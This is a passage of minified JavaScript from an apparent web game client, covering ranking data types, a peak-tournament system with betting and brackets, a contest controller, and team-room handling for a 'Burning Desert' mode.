n,n=window.RankDataType;!function(t){t.TYPE_POWER=0,t.TYPE_ARENA=1,t.TYPE_SKIRMISH=2,t.TYPE_PASS=3,t.TYPE_COPY=4,t.TYPE_LEVEL=5,t.TYPE_WING=16,t.TYPE_JOB_ZS=7,t.TYPE_JOB_FS=8,t.TYPE_JOB_DS=9,t.TYPE_LILIAN=10,t.TYPE_LADDER=11,t.TYPE_BAOSHI=12,t.TYPE_ZHANLING=13,t.TYPE_LONGHUN=14,t.TYPE_XUNZHANG=15,t.TYPE_XIAOFEI=-1,t.TYPE_BOOK=17,t.TYPE_ZS=18,t.TYPE_SCORE=19,t.TYPE_HF_XIAOFEI=21,t.TYPE_WEIWANG=22,t.TYPE_XIAYI=23,t.TYPE_RING=24,t.TYPE_YUANSHEN=25,t.TYPE_LUCKYNUMBER=50,t.TYPE_37KFBOSS=52,t.TYPE_DART=53,t.TYPE_GUILDDART=54,t.TYPE_HEIRLOOM=59,t.TYPE_SHENSHOU=60,t.TYPE_HEARTMETHOD=61,t.TYPE_MOSHEN=62,t.TYPE_QINGLONG=63,t.TYPE_BAIHU=64,t.TYPE_ZHUQUE=65,t.TYPE_XUANWU=66,t.TYPE_PET=67,t.TYPE_FOREST=68,t.TYPE_INVADE=69,t.TYPE_LINGJING=70,t.DATA_POS="pos",t.DATA_ID="id",t.DATA_PLAYER="player",t.DATA_LEVEL="level",t.DATA_ZHUAN="zhuan",t.DATA_VIP="vip",t.DATA_MONTH="month",t.DATA_JOB2="job2",t.DATA_POWER="power",t.DATA_COUNT="count",t.DATA_EXP="exp",t.DATA_JOB="job",t.DATA_SEX="sex",t.DATA_WEIWANG="weiWang",t.DATA_FORESTSTAR="forestStar",t.DATA_SERVERID="serverId",t.DATA_SCORE="score",t.DATA_TITLE="title",t.DATA_FRAME="frame",t.ITEMS=[],t.ITEMS[t.TYPE_POWER]=t.ITEMS[t.TYPE_WING]=t.ITEMS[t.TYPE_JOB_ZS]=t.ITEMS[t.TYPE_JOB_FS]=t.ITEMS[t.TYPE_JOB_DS]=[t.DATA_POS,t.DATA_ID,t.DATA_PLAYER,t.DATA_LEVEL,t.DATA_ZHUAN,t.DATA_VIP,t.DATA_MONTH,t.DATA_JOB2,t.DATA_POWER],t.ITEMS[t.TYPE_SKIRMISH]=[t.DATA_POS,t.DATA_ID,t.DATA_PLAYER,t.DATA_JOB,t.DATA_SEX,t.DATA_LEVEL,t.DATA_ZHUAN,t.DATA_VIP,t.DATA_COUNT,t.DATA_MONTH,t.DATA_JOB2],t.ITEMS[t.TYPE_LEVEL]=[t.DATA_POS,t.DATA_ID,t.DATA_PLAYER,t.DATA_LEVEL,t.DATA_ZHUAN,t.DATA_VIP,t.DATA_MONTH,t.DATA_JOB2],t.ITEMS[t.TYPE_PASS]=t.ITEMS[t.TYPE_COPY]=[t.DATA_POS,t.DATA_ID,t.DATA_PLAYER,t.DATA_POWER,t.DATA_VIP,t.DATA_COUNT,t.DATA_MONTH],t.ITEMS[t.TYPE_LILIAN]=[t.DATA_POS,t.DATA_ID,t.DATA_PLAYER,t.DATA_LEVEL,t.DATA_ZHUAN,t.DATA_VIP,t.DATA_MONTH,t.DATA_COUNT,t.DATA_EXP,t.DATA_JOB2],t.ITEMS[t.TYPE_XUNZHANG]=[t.DATA_POS,t.DATA_ID,t.DATA_PLAYER,t.DATA_LEVEL,t.DATA_ZHUAN,t.DATA_VIP,t.DATA_MONTH,t.DATA_COUNT,t.DATA_JOB2],t.ITEMS[t.TYPE_XIAYI]=[t.DATA_POS,t.DATA_ID,t.DATA_PLAYER,t.DATA_VIP,t.DATA_COUNT,t.DATA_JOB2],t.ITEMS[t.TYPE_FOREST]=[t.DATA_POS,t.DATA_ID,t.DATA_PLAYER,t.DATA_FORESTSTAR,t.DATA_SERVERID],t.ITEMS[t.TYPE_INVADE]=[t.DATA_POS,t.DATA_ID,t.DATA_PLAYER,t.DATA_SCORE,t.DATA_SERVERID,t.DATA_TITLE,t.DATA_FRAME,t.DATA_JOB,t.DATA_LEVEL],t.readFunc={},t.readFunc[t.DATA_JOB]=t.readFunc[t.DATA_SEX]="readByte",t.readFunc[t.DATA_POS]=t.readFunc[t.DATA_LEVEL]=t.readFunc[t.DATA_ZHUAN]=t.readFunc[t.DATA_VIP]=t.readFunc[t.DATA_MONTH]=t.readFunc[t.DATA_JOB2]="readShort",t.readFunc[t.DATA_ID]=t.readFunc[t.DATA_POWER]=t.readFunc[t.DATA_COUNT]=t.readFunc[t.DATA_EXP]="readInt",t.readFunc[t.DATA_POWER]="readDouble",t.readFunc[t.DATA_PLAYER]="readString"}(n=e.RankDataType||(e.RankDataType={})),window.RankDataType=n,window.RankDataType=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AttributeFormat=void 0;var n=function(){function t(){this.intervals=4,this.emptyLine=0,this.sign="+",this.endSign="",this.nameType=0,this.isShowAttName=1,this.wordColor=t.DEFAULT_COLOR,this.attrColor=t.DEFAULT_COLOR}return t.getFormat=function(e,i,n,o,s,a,r){void 0===e&&(e=4),void 0===i&&(i=0),void 0===n&&(n="+"),void 0===o&&(o=0),void 0===s&&(s=1),void 0===a&&(a=this.DEFAULT_COLOR),void 0===r&&(r=this.DEFAULT_COLOR);var l=new t;return l.intervals=e,l.emptyLine=i,l.sign=n,l.nameType=o,l.isShowAttName=s,l.wordColor=a,l.attrColor=r,l},t.FORMAT_0=function(){var t=this.getFormat(0,0,"：");return t.wordColor=t.attrColor=null,t},t.FORMAT_1=function(){return this.getFormat(0,0,"：")},t.FORMAT_2=function(){var t=this.FORMAT_1();return t.attrColor=3532333,t},t.DEFAULT_COLOR=14668213,t}();e.AttributeFormat=n,window.AttributeFormat=n,__reflect(n.prototype,"AttributeFormat",[]),window.AttributeFormat=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakedSys=void 0;var n=i(8),o=i(14),s=i(17),a=i(0),r=i(15),l=i(20),h=i(12),u=i(7),p=i(2),d=i(26),c=i(89),f=i(97),g=function(t){function e(){var e=t.call(this)||this;return e.player16List=[],e.player8List=[],e.player4List=[],e.topRankInfoList=[],e.betInfo=[],e.myBattleReportList=[],e.bfStatusIsEnd=0,e.kfStatusIsEnd=0,e.bfKonckReportList=[],e.kfPlayer64List=[],e.kfPlayer32List=[],e.kfPlayer16List=[],e.kfPlayer8List=[],e.kfPlayer4List=[],e.kfKonckReportList=[],e.kfTopRankInfoList=[],e.kfTopRankMbList=[],e.kfBetInfo=[],e.myKFBattleReportList=[],e.crossScene=1e4,e.PeakFbTime=0,e.rp=new s.RedPoint,e.dzRp=new s.RedPoint,e.mbRp=new s.RedPoint,e.sysId=PackageID.PKCompetition,e.regNetMsg(0,e.postState),e.regNetMsg(1,e.postSignUp),e.regNetMsg(2,e.doPKResult),e.regNetMsg(3,e.postEliminateReportData),e.regNetMsg(4,e.postBFInfoList),e.regNetMsg(5,e.postTopRank),e.regNetMsg(7,e.postBetInfo),e.regNetMsg(8,e.postKFEliminateReportData),e.regNetMsg(9,e.postKFInfoList),e.regNetMsg(10,e.postKFTopRank),e.regNetMsg(12,e.postKFBetInfo),e.regNetMsg(13,e.doFbCountDown),e.regNetMsg(14,e.postWorship),e.regNetMsg(15,e.updateTime),e.regNetMsg(16,e.postKFTopMbRank),observe(e,function(){e.isCrossScene()},Ts.enterScene.enterOK),e.initeRp(),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initeRp=function(){var t=new s.RedPoint(function(){return h.OpenSystem.ins().checkSysOpen(r.SystemType.Peak)&&e.ins().bfStatus==c.BF_PeakStatus.SignUp&&0==e.ins().isSignUp?!0:!1},this.postSignUp,this.postState,this.postKFInfoList,d.ZsCT.ins().postZsLv);this.dzRp.addSub(t),this.rp.addSub(this.dzRp);var i=new s.RedPoint(function(){return h.OpenSystem.ins().checkSysOpen(r.SystemType.Peak)&&(e.ins().worshipNum<a.GlobalConfig.PeakRaceBase.mobaiNum&&e.ins().kfPlayer2Data&&e.ins().kfPlayer2Data.winId&&e.ins().kfStatus>=c.KF_PeakStatus.Knockout&&e.ins().kfStatusIsEnd?1:0)?!0:!1},this.postWorship,this.postSignUp,this.postState);this.mbRp.addSub(i),this.rp.addSub(this.mbRp)},e.prototype.postState=function(t){var i=this;if(t&&(this.bfStatus=t.readByte(),this.bfStatusIsEnd=t.readByte(),this.kfStatus=t.readByte(),this.kfStatusIsEnd=t.readByte(),0==this.bfStatus&&(this.isSignUp=0)),this.bfStatus==c.BF_PeakStatus.Finals&&this.bfStatusIsEnd){var n=1e3*f.PeakedHelp.bfStatusTimer[c.BF_PeakStatus.Over]-u.GameServerCC.serverTime;this.kfStatus>c.KF_PeakStatus.None&&(n=0),0>=n?this.bfStatus=c.BF_PeakStatus.Over:Timer.start(n,1,function(){i.bfStatus=c.BF_PeakStatus.Over,i.postState(null)},this)}e.ins().isKf()?(e.ins().sendKFBetInfo(),this.kfStatus>=c.KF_PeakStatus.Knockout&&this.sendKFInfoList()):this.bfStatus>=c.BF_PeakStatus.Knockout&&this.sendBFInfoList()},e.prototype.postSignUp=function(t){this.isSignUp=t.readByte(),this.kideNum=t.readInt();t.readNumber(),t.readInt();return this.worshipNum=t.readByte(),this.isSignUp},e.prototype.doPKResult=function(t){var e=t.readByte();console.log("===67-2:推送比赛结果====>",!!e);var i=t.readString();win.open("PeakedFBResult",e,i)},e.prototype.postEliminateReportData=function(t){this.bfKonckRound=t.readShort(),this.bfKonckNextTimer=t.readInt(),this.bfKonckSurplusNum=t.readShort(),this.bfKonckReportList=[];for(var e=t.readShort(),i=0;e>i;i++){var n=new c.KonckReportData;n.readBFData(t),n.round=i+1,this.bfKonckReportList.push(n)}},e.prototype.postBFInfoList=function(t){var e;this.player16List=[];for(var i=t.readByte(),n=0;i>n;n++)e=new c.PeakPlayerData,e.readBaseData(t),this.player16List.push(e);this.player8List=[],i=t.readByte();for(var n=0;i>n;n++)e=new c.PeakPlayerData,e.playerList=[],e.readToData(t),f.PeakedHelp.pushPlayerList(this.player16List,this.player16List,e,n),this.player8List.push(e);this.player4List=[],i=t.readByte();for(var n=0;i>n;n++)e=new c.PeakPlayerData,e.playerList=[],e.readToData(t),f.PeakedHelp.pushPlayerList(this.player8List,this.player16List,e,n),this.player4List.push(e);this.player2Data=new c.PeakPlayerData,this.player2Data.playerList=[],this.player2Data.readToData(t),f.PeakedHelp.pushPlayerList(this.player4List,this.player16List,this.player2Data,0),this.myBattleReportList=f.PeakedHelp.countMyRecordData()},e.prototype.postTopRank=function(t){var e=t.readShort();this.topRankInfoList=[];for(var i=0;e>i;i++){var n=new c.PeakTopRankData(t);n.rank=i+1,this.topRankInfoList.push(n)}},e.prototype.postBetInfo=function(t){var e=t.readByte();this.betInfo=[];for(var i=0;e>i;i++){var n=new c.PeakBetData(t);this.betInfo.push(n)}win.get("PeakBetWin")&&p.TipsCT.ins().showTips(gettext("恭喜您，下注成功")),win.close("PeakBetWin")},e.prototype.postKFEliminateReportData=function(t){this.kfKonckRound=t.readShort(),this.kfKonckNextTimer=t.readInt(),this.kfKonckSurplusNum=t.readShort(),this.kfKonckReportList=[];for(var e=t.readShort(),i=0;e>i;i++){var n=new c.KonckReportData;n.readKFData(t),n.round=i+1,this.kfKonckReportList.push(n)}},e.prototype.postKFInfoList=function(t){var e;this.kfPlayer64List=[];for(var i=t.readByte(),n=0;i>n;n++)e=new c.PeakPlayerData,e.readBaseData(t,!0),this.kfPlayer64List.push(e);this.kfPlayer32List=[],i=t.readByte();for(var n=0;i>n;n++)e=new c.PeakPlayerData,e.playerList=[],f.PeakedHelp.pushPlayerList(this.kfPlayer64List,this.kfPlayer64List,e,n),e.readToData(t),this.kfPlayer32List.push(e);this.kfPlayer16List=[],i=t.readByte();for(var n=0;i>n;n++)e=new c.PeakPlayerData,e.playerList=[],f.PeakedHelp.pushPlayerList(this.kfPlayer32List,this.kfPlayer64List,e,n),e.readToData(t),this.kfPlayer16List.push(e);this.kfPlayer8List=[],i=t.readByte();for(var n=0;i>n;n++)e=new c.PeakPlayerData,e.playerList=[],f.PeakedHelp.pushPlayerList(this.kfPlayer16List,this.kfPlayer64List,e,n),e.readToData(t),this.kfPlayer8List.push(e);this.kfPlayer4List=[],i=t.readByte();for(var n=0;i>n;n++)e=new c.PeakPlayerData,e.playerList=[],f.PeakedHelp.pushPlayerList(this.kfPlayer8List,this.kfPlayer64List,e,n),e.readToData(t),this.kfPlayer4List.push(e);this.kfPlayer2Data=new c.PeakPlayerData,this.kfPlayer2Data.playerList=[],f.PeakedHelp.pushPlayerList(this.kfPlayer4List,this.kfPlayer64List,this.kfPlayer2Data,0),this.kfPlayer2Data.readToData(t),this.myKFBattleReportList=f.PeakedHelp.countKFMyRecordData()},e.prototype.postKFTopRank=function(t){var e=t.readShort();this.kfTopRankInfoList=[];for(var i=0;e>i;i++){var n=new c.PeakTopRankData(t);n.rank=i+1,this.kfTopRankInfoList.push(n)}},e.prototype.postKFBetInfo=function(t){var e=t.readByte();this.kfBetInfo=[];for(var i=0;e>i;i++){var n=new c.PeakBetData(t);this.kfBetInfo.push(n)}win.get("PeakBetWin")&&p.TipsCT.ins().showTips(gettext("恭喜您，下注成功")),win.close("PeakBetWin")},e.prototype.doFbCountDown=function(t){t.readInt()},e.prototype.postWorship=function(t){this.worshipNum=t.readByte()},e.prototype.updateTime=function(t){var e=t.readByte();f.PeakedHelp.bfStatusTimer=[],f.PeakedHelp.bfStatusTimer.push(0),f.PeakedHelp.kfStatusTimer=[],f.PeakedHelp.kfStatusTimer.push(0);for(var i=0;e>i;i++){var o=t.readInt();f.PeakedHelp.bfStatusTimer.push(n.DateUtils.formatMiniDateTime(o)/n.DateUtils.MS_PER_SECOND)}e=t.readByte();for(var i=0;e>i;i++){var o=t.readInt();f.PeakedHelp.kfStatusTimer.push(n.DateUtils.formatMiniDateTime(o)/n.DateUtils.MS_PER_SECOND)}},e.prototype.postKFTopMbRank=function(t){var e=t.readByte();this.kfTopRankMbList=[];for(var i=0;e>i;i++){var n=t.readInt(),o=t.readString(),s=t.readByte(),a=t.readInt(),r={id:n,playerName:o,job:s,serverId:a};this.kfTopRankMbList.push(r)}},e.prototype.sendSignUp=function(){this.sendBaseProto(1)},e.prototype.sendEliminateReport=function(){this.sendBaseProto(3)},e.prototype.sendBFInfoList=function(){this.sendBaseProto(4)},e.prototype.sendTopRank=function(){this.sendBaseProto(5)},e.prototype.sendToLikes=function(t){var e=this.getBytes(6);e.writeInt(t),this.sendToServer(e)},e.prototype.sendBet=function(t,e){var i=this.getBytes(7);i.writeInt(t),i.writeInt(e),this.sendToServer(i)},e.prototype.sendKFEliminateReport=function(){this.sendBaseProto(8)},e.prototype.sendKFInfoList=function(){this.sendBaseProto(9)},e.prototype.sendKFTopRank=function(){this.sendBaseProto(10)},e.prototype.sendKFToLikes=function(t){var e=this.getBytes(11);e.writeInt(t),this.sendToServer(e)},e.prototype.sendKFBet=function(t,e){var i=this.getBytes(12);i.writeInt(t),i.writeInt(e),this.sendToServer(i)},e.prototype.sendKFBetInfo=function(){this.sendBaseProto(13)},e.prototype.sendWorship=function(){this.sendBaseProto(14)},e.prototype.sendMbRank=function(){this.sendBaseProto(16)},e.prototype.isOpen=function(t){void 0===t&&(t=!1);var e="";return d.ZsCT.ins().stage<a.GlobalConfig.PeakRaceBase.needZsLv&&(e=gettext("{0}转开启",a.GlobalConfig.PeakRaceBase.needZsLv)),u.GameServerCC.serverOpenDay+1<a.GlobalConfig.PeakRaceBase.openDay&&(e=gettext("开服{0}天开启",a.GlobalConfig.PeakRaceBase.openDay)),t&&""!=e&&p.TipsCT.ins().showTips(e),""==e},e.prototype.isKf=function(){return this.bfStatus==c.BF_PeakStatus.Over&&0!=this.bfStatusIsEnd},e.prototype.isKFSixteen=function(){return this.kfStatus>c.KF_PeakStatus.Prom32||this.kfStatus==c.KF_PeakStatus.Prom32&&0!=this.kfStatusIsEnd},e.prototype.isCrossScene=function(){2==this.crossScene&&l.GameMap.sceneInMain()&&win.open("PlayWayWin",2),this.crossScene++},__decorate([post()],e.prototype,"postState",null),__decorate([post()],e.prototype,"postSignUp",null),__decorate([post()],e.prototype,"postEliminateReportData",null),__decorate([post()],e.prototype,"postBFInfoList",null),__decorate([post()],e.prototype,"postTopRank",null),__decorate([post()],e.prototype,"postBetInfo",null),__decorate([post()],e.prototype,"postKFEliminateReportData",null),__decorate([post()],e.prototype,"postKFInfoList",null),__decorate([post()],e.prototype,"postKFTopRank",null),__decorate([post()],e.prototype,"postKFBetInfo",null),__decorate([post()],e.prototype,"postWorship",null),__decorate([post()],e.prototype,"updateTime",null),__decorate([post()],e.prototype,"postKFTopMbRank",null),e}(o.BaseSystem);e.PeakedSys=g,window.PeakedSys=g,__reflect(g.prototype,"PeakedSys",[]),Systemap.PeakedSys=function(){return g.ins()},window.PeakedSys=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Contest_Status=e.ContestCT=void 0;var n=i(14),o=i(4),s=i(8),a=i(0),r=i(7),l=i(26),h=i(2),u=i(645),p=i(646),d=i(648),c=function(t){function e(){var e=t.call(this)||this;return e.isSignUp=!1,e.myRank=0,e.myScore=0,e.myWin=0,e.myLose=0,e.myDraw=0,e.myCurRecord=-1,e.myCurStage=-1,e.qualityInfos=[],e.contestInfos=[],e.myBetLogs=[],e.betTimes=0,e.betTotal=0,e.curBetStage=0,e.profit=0,e.stageType=0,e.contestMateArr=[],e.curSelBuffId=0,e.isOpeningView=!1,e.buffIdxArr=[],e.myCampId=0,e.sysId=PackageID.Contest,e.regNetMsg(1,e.postSignUp),e.regNetMsg(2,e.postQualityInfo),e.regNetMsg(3,e.updateOneContestInfo),e.regNetMsg(4,e.updateContestInfos),e.regNetMsg(5,e.postBetLogs),e.regNetMsg(6,e.postMatchInfo),e.regNetMsg(7,e.postFBOverTime),e.regNetMsg(8,e.postResult),e.regNetMsg(9,e.postBetInfo),e.regNetMsg(10,e.postMyQualityInfo),e.regNetMsg(11,e.postContestBuff),e.regNetMsg(25,e.postContestStatus),observe(e,e.init,o.ActorCC.init),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.init=function(){this.sendQualityInfo()},e.prototype.postSignUp=function(t){this.isSignUp=1==t.readUnsignedByte()},e.prototype.sendSignUp=function(){this.sendBaseProto(1)},e.prototype.sendQualityInfo=function(){this.sendBaseProto(2)},e.prototype.postQualityInfo=function(t){this.qualityInfos=[];for(var e=t.readUnsignedShort(),i=!1,n=0;e>n;n++){var s={rank:t.readUnsignedShort(),actorId:t.readUnsignedInt(),serverName:t.readUnsignedInt(),name:t.readString(),score:t.readUnsignedInt(),winNum:t.readUnsignedShort(),loseNum:t.readUnsignedShort(),drawNum:t.readUnsignedShort(),serverId:t.readUnsignedInt()};s.actorId==o.ActorCC.actorID&&(i=!0,this.myRank=s.rank,this.myScore=s.score,this.myWin=s.winNum,this.myLose=s.loseNum,this.myDraw=s.drawNum),this.qualityInfos.push(s)}i||this.sendMyQualityInfo()},e.prototype.updateOneContestInfo=function(t){var e=t.readUnsignedInt();for(var i in this.contestInfos){var n=this.contestInfos[i];if(n.actorId==e)return n.stage=t.readByte(),n.record=t.readByte(),n.time=t.readUnsignedInt(),0!=n.record&&egret.callLater(this.sortCB,this),n.actorId==o.ActorCC.actorID&&(this.myCurStage=n.stage,this.myCurRecord=n.record),void this.postContestInfo()}},e.prototype.sortCB=function(){this.contestInfos.sort(this.sort);for(var t=0;t<this.contestInfos.length;t++)this.contestInfos[t].rank=t+1;this.postContestInfo()},e.prototype.sort=function(t,e){return t.stage>e.stage?-1:t.stage<e.stage?1:t.record>e.record?-1:t.record<e.record?1:3==t.record&&t.time<e.time?-1:3==t.record&&t.time>e.time?1:1==t.record&&t.time>e.time?-1:1==t.record&&t.time<e.time?1:0},e.prototype.updateContestInfos=function(t){this.contestInfos=[];for(var e=t.readUnsignedShort(),i=0;e>i;i++){for(var n={rank:i+1,actorId:t.readUnsignedInt(),serverName:t.readUnsignedInt(),name:t.readString(),job:t.readByte(),sex:t.readByte(),level:t.readInt(),power:t.readDouble(),title:t.readInt(),outward:t.readInt(),stage:t.readByte(),record:t.readByte(),time:t.readUnsignedInt(),mateArr:[],buffIdxArr:[]},s=t.readByte(),a=0;s>a;a++){var r={serverName:t.readUnsignedInt(),name:t.readString(),level:t.readInt(),power:t.readDouble(),title:t.readInt(),outward:t.readInt(),job:t.readByte(),sex:0};n.mateArr.push(r)}for(var l=t.readByte(),a=0;l>a;a++){var h=t.readUnsignedByte();n.buffIdxArr.push(h)}n.actorId==o.ActorCC.actorID&&(this.myCurStage=n.stage,this.myCurRecord=n.record),this.contestInfos.push(n)}this.postContestInfo()},e.prototype.postContestInfo=function(){},e.prototype.sendContestInfos=function(){var t=this.getBytes(4);this.sendToServer(t)},e.prototype.sendBet=function(t,e,i){var n=this.getBytes(5);n.writeInt(t),n.writeInt(e),n.writeByte(i),this.sendToServer(n)},e.prototype.postBetLogs=function(t){this.betTimes=t.readUnsignedShort(),this.betTotal=t.readUnsignedInt(),this.profit=t.readUnsignedInt();var e=t.readShort();this.myBetLogs=[];for(var i=0;e>i;i++){var n={stage:t.readByte(),targetName:t.readString(),betNum:t.readInt(),winNum:t.readInt(),targetActorId:t.readInt(),betType:t.readByte()};this.myBetLogs.push(n)}},e.prototype.postMatchInfo=function(t){this.contestMateArr=[];for(var e=s.DateUtils.formatMiniDateTime(t.readUnsignedInt()),i=t.readUnsignedShort(),n=0;i>n;n++){var o={name:t.readString(),serverName:t.readUnsignedByte(),job:t.readUnsignedByte(),sex:t.readUnsignedByte(),level:t.readInt(),power:t.readDouble(),title:t.readInt(),outward:t.readInt()};this.contestMateArr.push(o)}win.get("ContestMainWin")&&win.close("ContestMainWin"),win.open(p.ContestVSWin,e,this.contestMateArr)},e.prototype.postFBOverTime=function(t){var e=s.DateUtils.formatMiniDateTime(t.readUnsignedInt());win.open(d.LeftTimeWin,e)},e.prototype.postResult=function(t){var e=t.readByte(),i=t.readUnsignedInt();t.readBoolean();win.open(u.ContestResultWin,e,i)},e.prototype.postBetInfo=function(t){this.curBetStage=t.readByte();t.readUnsignedInt(),t.readUnsignedInt()},e.prototype.sendMyQualityInfo=function(){this.sendBaseProto(10)},e.prototype.postMyQualityInfo=function(t){this.myRank=t.readUnsignedShort(),this.myScore=t.readUnsignedInt(),this.myWin=t.readUnsignedShort(),this.myLose=t.readUnsignedShort(),this.myDraw=t.readUnsignedShort()},e.prototype.postContestStatus=function(t){this.stageType=t.readByte(),this.betStage=1==t.readByte();var e=t.readUnsignedInt();this.stageOverTime=s.DateUtils.formatMiniDateTime(e)},e.prototype.sendContestBuff=function(t){var e=this.getBytes(11),i=t.length;e.writeByte(i);for(var n=0;i>n;n++)e.writeByte(t[n]);this.sendToServer(e)},e.prototype.postContestBuff=function(t){for(var e=t.readUnsignedByte(),i=0;e>i;i++){var n=t.readUnsignedByte();this.buffIdxArr.push({idx:n})}},e.prototype.checkOpen=function(t){void 0===t&&(t=!1);var e=a.GlobalConfig.ProtectArenaBase,i="";
return r.GameServerCC.serverOpenDay+1<e.openDay?i=gettext("开服{0}天开启",e.openDay):l.ZsCT.ins().lv<e.needZsLv?i=gettext("{0}转开启",e.needZsLv):0==this.stageType&&(i=gettext("活动暂未开放")),t&&""!=i&&h.TipsCT.ins().showTips(i),""==i},e.getTotalRecord=function(t,e,i){return void 0===t&&(t=0),gettext("{0}胜{1}平{2}负",t,e,i)},e.getRecord=function(t){var e=[gettext("暂无"),gettext("淘汰"),gettext("比赛中"),gettext("胜利")];return e[t]||""},e.getStageName=function(t){var e=["","",gettext("资格赛"),"1V2","1V3","1V4","1V5","1V6","1V7","1V8",""];return e[t]},e.prototype.getRemainderNum=function(){var t=0;for(var e in this.contestInfos)1!=this.contestInfos[e].record&&t++;return t},e.prototype.checkIsFriend=function(t){return this.myCampId==t},e.prototype.getBuffIdByIdx=function(t){var e=a.GlobalConfig.ProtectArenaBase.monsterBuff;if(!e||!e.id)return 0;var i=e.id[t];return i},e.prototype.getBuffMonIcon=function(t){if(!t)return"";var e=a.GlobalConfig.ProtectArenaBase.buffmonID,i=a.GlobalConfig.ProtectArenaBase.buffmonIcon,n=e.indexOf(t),o="";return-1!==n&&i[n]&&(o=i[n].toString()),RES_DIR_ITEMICON+o+".png"},e.prototype.getBuffMonDesc=function(t){var e=a.GlobalConfig.ProtectArenaBase.buffmonID,i=a.GlobalConfig.ProtectArenaBase.buffmonDesc,n=e.indexOf(t);return-1!==n?i[n]||"":""},e.prototype.getBuffByStage=function(t){3>=t&&(t=3);var e=a.GlobalConfig.ProtectArenaTime;for(var i in e)if(e[i].status==t)return e[i];return null},e.prototype.getBetLog=function(t,e){for(var i=this.myBetLogs,n=0,o=i;n<o.length;n++){var s=o[n];if(s.targetActorId==t&&s.stage==e)return s}return null},e.prototype.getQualityRound=function(){var t=a.GlobalConfig.ProtectArenaTime[2];if(!t)return 0;var e=a.GlobalConfig.ProtectArenaBase.promBattleNextTime,i=r.GameServerCC.serverTime,n=s.DateUtils.formatStrTimeToToday1(t.startTime,i),o=Math.floor((i-n)/e/1e3)+1;return o},e.prototype.getPromCountAryNum=function(){for(var t=e.ins().qualityInfos.length,i=a.GlobalConfig.ProtectArenaBase.promCountAry,n=0;n<i.length;n++)if(t>=i[n].min&&t<=i[n].max)return i[n].count;return 0},__decorate([post()],e.prototype,"postSignUp",null),__decorate([post()],e.prototype,"postQualityInfo",null),__decorate([post()],e.prototype,"postContestInfo",null),__decorate([post()],e.prototype,"postBetLogs",null),__decorate([post()],e.prototype,"postMatchInfo",null),__decorate([post()],e.prototype,"postFBOverTime",null),__decorate([post()],e.prototype,"postResult",null),__decorate([post()],e.prototype,"postBetInfo",null),__decorate([post()],e.prototype,"postMyQualityInfo",null),__decorate([post()],e.prototype,"postContestStatus",null),__decorate([post()],e.prototype,"postContestBuff",null),e}(n.BaseSystem);e.ContestCT=c,window.ContestCT=c,__reflect(c.prototype,"ContestCT",[]);var f;!function(t){t[t.None=0]="None",t[t.Sign=1]="Sign",t[t.Knockout=2]="Knockout",t[t.Prom2=3]="Prom2",t[t.Prom3=4]="Prom3",t[t.Prom4=5]="Prom4",t[t.Prom5=6]="Prom5",t[t.Prom6=7]="Prom6",t[t.Prom7=8]="Prom7",t[t.Prom8=9]="Prom8",t[t.Over=10]="Over"}(f=e.Contest_Status||(e.Contest_Status={})),window.Contest_Status=f,Systemap.ContestCT=function(){return c.ins()},window.ContestCT=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BurningDesertMemberVo=e.BurningDesertRoomInfo=e.BurningDesertCT=e.HotDesertFbEnum=void 0;var n,o=i(14),s=i(0),a=i(4),r=i(20),l=i(45),h=i(7),u=i(2),p=i(190);!function(t){t[t.ShiKongZhiJing=101]="ShiKongZhiJing",t[t.Invade=102]="Invade",t[t.SixReincarnations=103]="SixReincarnations",t[t.CrossDartCar=104]="CrossDartCar",t[t.StarDomain=105]="StarDomain"}(n=e.HotDesertFbEnum||(e.HotDesertFbEnum={})),window.HotDesertFbEnum=n;var d=function(t){function e(){var e=t.call(this)||this;return e._roomId=0,e.playerBuffArr=[],e.monsterBuffArr=[],e.nextCanInviteTime=0,e.sceneBossReliveTime=-1,e.selBossLv=-1,e.sysId=PackageID.Guanqia,e.regNetMsg(94,e.buildRoomBack),e.regNetMsg(95,e.roomMemberInfoBack),e.regNetMsg(96,e.enterRoomBack),e.regNetMsg(97,e.exitRoomBack),e.regNetMsg(102,e.myInfoBack),e.regNetMsg(103,e.sceneBuffInfoBack),e.regNetMsg(104,e.invitePlayerBack),e.regNetMsg(105,e.bossInfoBack),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},Object.defineProperty(e.prototype,"roomId",{get:function(){return this._roomId},set:function(t){this._roomId=t,this.postRoomChange()},enumerable:!1,configurable:!0}),e.prototype.postRoomChange=function(){},e.prototype.reqBuildRoom=function(t){var e=this.getBytes(94);e.writeByte(t),this.sendToServer(e)},e.prototype.buildRoomBack=function(t){this.roomId=t.readDouble()},e.prototype.roomMemberInfoBack=function(t){this.roomInfo=new c,this.roomInfo.parse(t),this.roomId=this.roomInfo.roomId},e.prototype.reqEnterRoom=function(t){var e=this.getBytes(96);e.writeDouble(t),this.sendToServer(e)},e.prototype.enterRoomBack=function(t){var e=t.readByte();if(0==e)this.roomId=t.readDouble(),win.open(p.BurningDesertRoomView);else switch(e){case 2:u.TipsCT.ins().showTips(gettext("在副本内，不能进入"));break;case 3:u.TipsCT.ins().showTips(gettext("已经在别的房间"));break;case 4:u.TipsCT.ins().showTips(gettext("要进入的房间不存在"));break;case 7:u.TipsCT.ins().showTips(gettext("房间已经满人"))}},e.prototype.reqExitRoom=function(){var t=this.getBytes(97);this.sendToServer(t)},e.prototype.exitRoomBack=function(t){var e=t.readByte();switch(e){case 1:u.TipsCT.ins().showTips(gettext("退出队伍成功！"));break;case 2:u.TipsCT.ins().showTips(gettext("@_@你被踢出了队伍！"));break;case 3:u.TipsCT.ins().showTips(gettext("队长解散了队伍！"))}this.roomId=0,this.roomInfo=null,win.close(p.BurningDesertRoomView)},e.prototype.reqEnterBurnDesert=function(t){var e=this.getBytes(98);e.writeByte(t),this.sendToServer(e)},e.prototype.reqKickoutMember=function(t){var e=this.getBytes(99);e.writeInt(t),this.sendToServer(e)},e.prototype.reqLookTeamInfo=function(){var t=this.getBytes(100);this.sendToServer(t)},e.prototype.reqSwitchMap=function(t){var 